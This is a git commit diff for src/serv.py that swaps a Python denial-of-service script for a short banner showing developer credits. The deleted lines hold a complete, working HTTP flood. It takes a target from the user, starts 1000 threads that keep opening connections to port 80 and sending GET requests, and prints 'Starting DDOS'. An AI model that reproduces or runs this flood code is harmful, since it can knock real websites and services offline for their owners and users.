bc64174637df44fc3608b7a9252f4eea4d6c4525
litianots <lyranoct832@gmail.com>
2026-06-11 13:06:00 +0700

    Update serv.py

--- src/serv.py
+++ src/serv.py
@@ -1,31 +1,13 @@
-import socket
-import threading
-import sys
+import os
 
-if len(sys.argv) < 2:
-    target = input("Masukkan URL/IP target: ").strip()
-else:
-    target = sys.argv[1]
+def serv():
+    print("=" * 40)
+    print("         Developer : Pajar")
+    print("    GitHub : fajaarr1002-create")
+    print("=" * 40)
 
-try:
-    target_ip = socket.gethostbyname(target)
-except:
-    target_ip = target
+    input("\nPress ENTER to continue...")
+    os.system("clear")
 
-target_port = 80
-num_threads = 1000
-
-def ddos_attack():
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((target_ip, target_port))
-            s.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
-            s.close()
-        except:
-            pass
-
-print(f"Starting DDOS on {target} ({target_ip})...")
-for i in range(num_threads):
-    t = threading.Thread(target=ddos_attack)
-    t.start()
+if __name__ == "__main__":
+    serv()
